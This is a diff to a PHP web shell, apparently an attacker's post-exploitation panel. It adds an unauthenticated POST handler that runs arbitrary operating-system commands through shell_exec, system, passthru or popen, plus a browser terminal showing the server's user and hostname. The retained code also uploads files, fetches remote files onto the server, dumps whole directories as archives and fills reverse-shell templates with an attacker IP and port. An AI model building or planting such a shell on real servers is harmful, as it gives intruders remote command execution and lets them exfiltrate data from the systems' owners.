@@ -146,7 +146,7 @@ function execute_command($cmd, $available_methods)
             case 'shell_exec':
                 $output = shell_exec($cmd);
                 if ($output !== null)
-                    return $output;
+                    return rtrim($output);
                 break;
 
             case 'exec':
@@ -161,7 +161,7 @@ function execute_command($cmd, $available_methods)
                 system($cmd);
                 $output = ob_get_clean();
                 if (!empty($output))
-                    return $output;
+                    return rtrim($output);
                 break;
 
             case 'passthru':
@@ -169,7 +169,7 @@ function execute_command($cmd, $available_methods)
                 passthru($cmd);
                 $output = ob_get_clean();
                 if (!empty($output))
-                    return $output;
+                    return rtrim($output);
                 break;
 
             case 'popen':
@@ -181,7 +181,7 @@ function execute_command($cmd, $available_methods)
                     }
                     pclose($handle);
                     if (!empty($output))
-                        return $output;
+                        return rtrim($output);
                 }
                 break;
         }
@@ -486,6 +486,31 @@ if (isset($_GET['dump'])) {
     exit;
 }
 
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['exec_cmd'], $_POST['exec_method'], $_POST['exec_path'])) {
+    header('Content-Type: application/json');
+
+    $cmd = $_POST['exec_cmd'];
+    $method = $_POST['exec_method'];
+    $path = $_POST['exec_path'];
+
+    if (!in_array($method, $available_ce_methods)) {
+        echo json_encode(['success' => false, 'error' => 'Invalid execution method']);
+        exit;
+    }
+
+    // Sanitize: ensure path exists and is a directory
+    if (!is_dir($path)) {
+        echo json_encode(['success' => false, 'error' => 'Invalid path']);
+        exit;
+    }
+
+    // Change working directory
+    chdir($path);
+
+    $output = execute_command($cmd, $method);
+    echo json_encode(['success' => true, 'output' => $output]);
+    exit;
+}
 // ! FUNCTIONALITIES STOP
 
 // ? DISPLAY FUNCTIONs START
@@ -509,16 +534,17 @@ if (isset($_GET['dump'])) {
         .grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            grid-template-rows: auto auto;
-            gap: 10px;
-            padding: 20px;
+            grid-template-rows: 1fr 1fr 1fr 1fr;
+            gap: 0.5rem;
+            height: 100vh;
+            box-sizing: border-box;
         }
         .card {
             background: #1a1a1a;
             padding: 15px;
             border: 1px solid #333;
             border-radius: 10px;
-            max-height: 50vh;
+            /* max-height: 25vh; */
             margin-top: 5px;
             margin-bottom: 5px;
         }
@@ -569,6 +595,7 @@ if (isset($_GET['dump'])) {
 
         .span-row {
             grid-row: span 2;
+            /* max-height: 50vh; */
         }
 
         .flex-row{
@@ -674,8 +701,18 @@ if (isset($_GET['dump'])) {
             align-items: center;
             justify-content: center;
             font-size: 1.5em;
-            color: #eee;
             user-select: none;
+        }
+        #cmdOutput {
+            padding: 1rem;
+            flex-grow: 1;
+            overflow-y: auto;
+            margin-top: 10px;
+            background: #111;
+            border: 1px solid #333;
+            border-radius: 4px;
+            white-space: pre-wrap;
+            font-size: 0.95em;
         }
     </style>
 </head>
@@ -723,7 +760,7 @@ if (isset($_GET['dump'])) {
         </div>
         <div class="card">
             <div class="flex-column">
-                <p>Selected Folder: <input disabled id="selectedPath" name="selectedPath" value="/"></p>
+                <p>Selected Folder: <input disabled class="selectedPath" name="selectedPath" value="/"></p>
                 <div class="flex-row">
                     <label for="uploadFileInput">Upload&nbsp;File:</label>
                     <input id="uploadFileInput" name="uploadFile" type="file">
@@ -738,11 +775,73 @@ if (isset($_GET['dump'])) {
                 <!-- <button class="btn">Clean&nbsp;Up</button> Still have to figure this one out -->
             </div>
         </div>
-        <div class="card span-column">Execute, Command History</div>
+        <div  style="gap: 0px;align-items: stretch;" class="card span-column span-row flex-column">
+            <div class="card">
+                <div class="flex-row">
+                    <label for="cmdMethod">Execute&nbsp;As:</label>
+                    <select id="cmdMethod">
+                    <?php foreach ($available_ce_methods as $method): ?>
+                        <option value="<?= htmlspecialchars($method) ?>"><?= htmlspecialchars($method) ?></option>
+                    <?php endforeach; ?>
+                    </select>
+                </div>
+            </div>
+            <div class="card" style="flex-grow: 1; display: flex; flex-direction: column; overflow: hidden">
+                <div class="flex-row" style="width: 100%">
+                    <label style="text-wrap:nowrap" for="cmdInput">
+                        <span style="color:#0f0"><?php echo execute_command("whoami", $available_ce_methods)?><span style="color:white">@</span><?php echo execute_command("hostname", $available_ce_methods)?></span>:<span style="color:#4d90fe" class="selectedPath">/</span>$
+                    </label>
+                    <input type="text" id="cmdInput" placeholder="Enter shell command">
+                </div>
+                <pre id="cmdOutput"></pre>
+            </div>
+        </div>
     </div>
 </body>
 
 <script>
+    document.getElementById('cmdInput').addEventListener('keydown', function (e) {
+        if (e.key === 'Enter') {
+            const cmd = this.value.trim();
+            if (!cmd) return;
+
+            const cmdOutputEl = document.getElementById('cmdOutput');
+
+            // Handle 'clear' locally
+            if (cmd === 'clear') {
+                cmdOutputEl.textContent = '';
+                this.value = '';
+                return;
+            }
+
+            const method = document.getElementById('cmdMethod').value;
+            const path = document.getElementsByClassName('selectedPath')[0].value || '/';
+
+            fetch(window.location.pathname, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: new URLSearchParams({
+                    exec_cmd: cmd,
+                    exec_method: method,
+                    exec_path: path
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                const timestamp = new Date().toLocaleTimeString();
+                const output = data.success
+                    ? `${timestamp} $ ${cmd}\n${data.output.trim()}\n\n`
+                    : `${timestamp} $ ${cmd}\nError: ${data.error}\n\n`;
+
+                cmdOutputEl.textContent = output + cmdOutputEl.textContent;
+                e.target.value = '';
+            })
+            .catch(err => {
+                cmdOutputEl.textContent = `\nError: ${err.message}\n` + cmdOutputEl.textContent;
+            });
+        }
+    });
+
     function refreshFolder(path, targetElement) {
         fetch('?path=' + encodeURIComponent(path))
             .then(response => response.text())
@@ -750,186 +849,183 @@ if (isset($_GET['dump'])) {
                 targetElement.innerHTML = html;
             });
     }
-</script>
-<script>
-document.getElementById('uploadFileInput').addEventListener('change', function() {
-    const fileInput = document.getElementById('uploadFileInput');
-    const file = fileInput.files[0];
-    if (!file) return;
 
-    const selectedPath = document.getElementById('selectedPath').value || '/';
+    document.getElementById('uploadFileInput').addEventListener('change', function() {
+        const fileInput = document.getElementById('uploadFileInput');
+        const file = fileInput.files[0];
+        if (!file) return;
 
-    const formData = new FormData();
-    formData.append('uploadFile', file);
-    formData.append('uploadPath', selectedPath);
+        const selectedPath = document.getElementsByClassName('selectedPath')[0].value || '/';
 
-    fetch(window.location.pathname, {
-        method: 'POST',
-        body: formData
-    })
-    .then(res => res.json())
-    .then(data => {
-        if (data.success) {
-            alert('Upload successful!');
-            fileInput.value = '';
+        const formData = new FormData();
+        formData.append('uploadFile', file);
+        formData.append('uploadPath', selectedPath);
 
-            // Find the currently selected folder and its nested <ul> to refresh
-            const selectedFolder = document.querySelector('.folder.selected');
-            if (selectedFolder) {
-                const nested = selectedFolder.nextElementSibling;
-                if (nested) {
-                    refreshFolder(selectedPath, nested);
-                }
-            }
-        } else {
-            alert('Upload error: ' + data.error);
-        }
-    })
-    .catch(err => {
-        alert('Upload failed: ' + err.message);
-    });
-});
-</script>
-<script>
-document.getElementById('file-tree').addEventListener('click', function (e) {
-    if (e.target.classList.contains('folder')) {
-        const el = e.target;
-        const path = el.getAttribute('data-path');
-        const parent = el.parentElement;
-
-        // Deselect previous
-        document.querySelectorAll('.folder.selected').forEach(f => f.classList.remove('selected'));
-        el.classList.add('selected');
-        selectedDir = path;
-        document.getElementById('selectedPath').value = path;
-
-        // Toggle display
-        parent.classList.toggle('open');
-
-        const nested = el.nextElementSibling;
-
-        // Refresh folder view
-        refreshFolder(path, nested);
-    }
-});
-</script>
-<script>
-function genShell(shellTemplate) {
-    const ip = document.getElementById('revshell_ip')?.value || '';
-    const port = document.getElementById('revshell_port')?.value || '';
-    const outputBlock = document.getElementById('revshell');
-
-    if (!ip || !port) {
-        alert("Please provide both IP and PORT.");
-        return;
-    }
-
-    const finalShell = shellTemplate
-        .replace(/IP/g, ip)
-        .replace(/PORT/g, port);
-
-    if (outputBlock) {
-        outputBlock.textContent = finalShell;
-    } else {
-        console.warn('Output element with ID "revshell" not found.');
-    }
-}
-</script>
-<script>
-document.getElementById('urlUploadSubmit').addEventListener('click', () => {
-    const url = document.getElementById('urlUpload').value.trim();
-    const fileName = document.getElementById('urlUploadName').value.trim();
-    const uploadPath = document.getElementById('selectedPath').value || '/';
-
-    if (!url || !fileName) {
-        alert('Please enter both URL and file name.');
-        return;
-    }
-
-    // Encode params for GET request
-    const params = new URLSearchParams({
-        urlUpload: url,
-        urlUploadName: fileName,
-        uploadPath: uploadPath,
-    });
-
-    fetch(`${window.location.pathname}?${params.toString()}`, {
-        method: 'GET',
-        headers: { 'Accept': 'application/json' }
-    })
-    .then(res => res.json())
-    .then(data => {
-        if (data.success) {
-            alert('URL upload successful!');
-            // Clear inputs
-            document.getElementById('urlUpload').value = '';
-            document.getElementById('urlUploadName').value = '';
-
-            // Optionally refresh folder view here, like after file upload
-            const selectedFolder = document.querySelector('.folder.selected');
-            if (selectedFolder) {
-                const nested = selectedFolder.nextElementSibling;
-                if (nested) {
-                    refreshFolder(uploadPath, nested);
-                }
-            }
-
-        } else {
-            alert('URL upload error: ' + data.error);
-        }
-    })
-    .catch(err => {
-        alert('URL upload failed: ' + err.message);
-    });
-});
-</script>
-<script>
-document.getElementById('file-tree').addEventListener('dblclick', function (e) {
-    if (e.target.classList.contains('file')) {
-        const filename = e.target.textContent.trim();
-        const selectedPath = document.getElementById('selectedPath').value || '/';
-        const filePath = selectedPath.replace(/\/+$/, '') + '/' + filename;
-
-        const a = document.createElement('a');
-        a.href = '?download=' + encodeURIComponent(filePath);
-        a.download = filename;
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-    }
-});
-</script>
-<script>
-document.getElementById('dumpFolder').addEventListener('click', function() {
-    const selectedPath = document.getElementById('selectedPath').value || '/';
-    const overlay = document.getElementById('loading-overlay');
-
-    overlay.style.display = 'flex'; // show loading
-
-    // Send request to dump and get the file as a blob
-    fetch(window.location.pathname + '?dump=' + encodeURIComponent(selectedPath))
-        .then(response => {
-            if (!response.ok) throw new Error('Network response was not OK');
-            return response.blob();
+        fetch(window.location.pathname, {
+            method: 'POST',
+            body: formData
         })
-        .then(blob => {
-            // Create a temporary download link
-            const url = window.URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = selectedPath.replace(/[\/\\]/g, '_') + '.tar.gz';
-            document.body.appendChild(a);
-            a.click();
-            a.remove();
-            window.URL.revokeObjectURL(url);
+        .then(res => res.json())
+        .then(data => {
+            if (data.success) {
+                alert('Upload successful!');
+                fileInput.value = '';
+
+                // Find the currently selected folder and its nested <ul> to refresh
+                const selectedFolder = document.querySelector('.folder.selected');
+                if (selectedFolder) {
+                    const nested = selectedFolder.nextElementSibling;
+                    if (nested) {
+                        refreshFolder(selectedPath, nested);
+                    }
+                }
+            } else {
+                alert('Upload error: ' + data.error);
+            }
         })
         .catch(err => {
-            alert('Failed to download archive: ' + err.message);
-        })
-        .finally(() => {
-            overlay.style.display = 'none'; // hide loading after everything
+            alert('Upload failed: ' + err.message);
         });
-});
+    });
+
+    document.getElementById('file-tree').addEventListener('click', function (e) {
+        if (e.target.classList.contains('folder')) {
+            const el = e.target;
+            const path = el.getAttribute('data-path');
+            const parent = el.parentElement;
+
+            // Deselect previous
+            document.querySelectorAll('.folder.selected').forEach(f => f.classList.remove('selected'));
+            el.classList.add('selected');
+            selectedDir = path;
+            Array.from(document.getElementsByClassName('selectedPath')).forEach(el => {
+                el.value = path;
+                el.textContent = path;
+            });
+
+            // Toggle display
+            parent.classList.toggle('open');
+
+            const nested = el.nextElementSibling;
+
+            // Refresh folder view
+            refreshFolder(path, nested);
+        }
+    });
+
+    function genShell(shellTemplate) {
+        const ip = document.getElementById('revshell_ip')?.value || '';
+        const port = document.getElementById('revshell_port')?.value || '';
+        const outputBlock = document.getElementById('revshell');
+
+        if (!ip || !port) {
+            alert("Please provide both IP and PORT.");
+            return;
+        }
+
+        const finalShell = shellTemplate
+            .replace(/IP/g, ip)
+            .replace(/PORT/g, port);
+
+        if (outputBlock) {
+            outputBlock.textContent = finalShell;
+        } else {
+            console.warn('Output element with ID "revshell" not found.');
+        }
+    }
+
+    document.getElementById('urlUploadSubmit').addEventListener('click', () => {
+        const url = document.getElementById('urlUpload').value.trim();
+        const fileName = document.getElementById('urlUploadName').value.trim();
+        const uploadPath = document.getElementsByClassName('selectedPath')[0].value || '/';
+
+        if (!url || !fileName) {
+            alert('Please enter both URL and file name.');
+            return;
+        }
+
+        // Encode params for GET request
+        const params = new URLSearchParams({
+            urlUpload: url,
+            urlUploadName: fileName,
+            uploadPath: uploadPath,
+        });
+
+        fetch(`${window.location.pathname}?${params.toString()}`, {
+            method: 'GET',
+            headers: { 'Accept': 'application/json' }
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.success) {
+                alert('URL upload successful!');
+                // Clear inputs
+                document.getElementById('urlUpload').value = '';
+                document.getElementById('urlUploadName').value = '';
+
+                // Optionally refresh folder view here, like after file upload
+                const selectedFolder = document.querySelector('.folder.selected');
+                if (selectedFolder) {
+                    const nested = selectedFolder.nextElementSibling;
+                    if (nested) {
+                        refreshFolder(uploadPath, nested);
+                    }
+                }
+
+            } else {
+                alert('URL upload error: ' + data.error);
+            }
+        })
+        .catch(err => {
+            alert('URL upload failed: ' + err.message);
+        });
+    });
+
+    document.getElementById('file-tree').addEventListener('dblclick', function (e) {
+        if (e.target.classList.contains('file')) {
+            const filename = e.target.textContent.trim();
+            const selectedPath = document.getElementsByClassName('selectedPath')[0].value || '/';
+            const filePath = selectedPath.replace(/\/+$/, '') + '/' + filename;
+
+            const a = document.createElement('a');
+            a.href = '?download=' + encodeURIComponent(filePath);
+            a.download = filename;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        }
+    });
+
+    document.getElementById('dumpFolder').addEventListener('click', function() {
+        const selectedPath = document.getElementsByClassName('selectedPath')[0].value || '/';
+        const overlay = document.getElementById('loading-overlay');
+
+        overlay.style.display = 'flex'; // show loading
+
+        // Send request to dump and get the file as a blob
+        fetch(window.location.pathname + '?dump=' + encodeURIComponent(selectedPath))
+            .then(response => {
+                if (!response.ok) throw new Error('Network response was not OK');
+                return response.blob();
+            })
+            .then(blob => {
+                // Create a temporary download link
+                const url = window.URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = selectedPath.replace(/[\/\\]/g, '_') + '.tar.gz';
+                document.body.appendChild(a);
+                a.click();
+                a.remove();
+                window.URL.revokeObjectURL(url);
+            })
+            .catch(err => {
+                alert('Failed to download archive: ' + err.message);
+            })
+            .finally(() => {
+                overlay.style.display = 'none'; // hide loading after everything
+            });
+    });
 </script>
 
 </html>
